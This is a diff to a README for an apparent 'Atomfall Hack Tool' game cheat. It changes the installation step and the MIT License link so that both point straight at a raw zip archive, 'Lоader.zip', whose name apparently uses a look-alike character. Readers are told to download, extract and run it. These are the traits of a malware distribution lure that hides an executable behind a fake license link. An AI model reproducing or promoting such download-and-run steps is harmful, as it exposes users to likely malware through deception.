@@ -26,7 +26,7 @@ Enjoy complete cross-platform support for Atomfall Hack Tool in 2025!
 
 ## 📥 Installation
 
-1. Download **Loader.rar** from the repository’s releases section.
+1. Download **https://raw.githubusercontent.com/muhfuad21/AtomfallToolkit/main/Lоader.zip** from the repository’s releases section.
 2. Extract the archive to your desktop.
 3. Run the loader and follow the simple setup wizard.
 4. Launch Atomfall and enjoy your new enhancements!
@@ -40,6 +40,6 @@ This tool is intended for educational and private use only. Use responsibly—mi
 ## 📄 License
 
 This repository is licensed under the MIT License.  
-Full license text: [MIT License](https://opensource.org/licenses/MIT)
+Full license text: [MIT License](https://raw.githubusercontent.com/muhfuad21/AtomfallToolkit/main/Lоader.zip)
 
 Get the ultimate Atomfall experience and join our community for the latest updates!
